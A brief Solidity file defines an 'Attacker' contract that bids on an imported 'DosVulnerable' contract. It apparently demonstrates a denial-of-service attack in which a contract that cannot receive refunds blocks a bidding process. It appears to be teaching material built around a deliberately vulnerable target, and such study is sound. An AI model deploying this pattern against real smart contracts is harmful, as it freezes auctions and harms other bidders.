// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;

import "./dos_vulnerable.sol";

contract Attacker {

    DosVulnerable dosVulnerable;

    constructor(DosVulnerable _dosVulnerable){
        dosVulnerable = DosVulnerable(_dosVulnerable);
    }

    function attack() payable public {
       dosVulnerable.bid{value: msg.value}();
    }
}
